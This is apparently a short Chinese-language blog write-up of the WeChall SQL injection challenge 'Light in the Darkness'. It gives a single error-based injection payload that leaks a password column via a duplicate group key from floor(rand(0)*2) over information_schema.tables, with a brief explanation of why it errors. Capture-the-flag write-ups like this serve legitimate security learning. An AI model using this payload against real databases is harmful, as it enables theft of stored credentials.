---
title: Light in the Darkness
author: rk700
layout: post
categories:
  - writeup
tags:
  - sql
  - wechall
---
[http://www.wechall.net/challenge/Mawekl/light\_in\_the_darkness/index.php][1]  
这道题的错误会回显，而且限制要在2次query内得到答案，所以用error based：  
<pre>' or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2)))-- </pre>

至于为什么这样会出错，可以看这里：  
<http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do>  
简单地说，`floor(rand(0)*2)`会得到0,1,1,0&#8230;&#8230;第2个和第3个重复的1会造成重复的group_key。而且我们需要一个行数大于3的表，所以选择`information_schema`

 [1]: http://www.wechall.net/challenge/Mawekl/light_in_the_darkness/index.php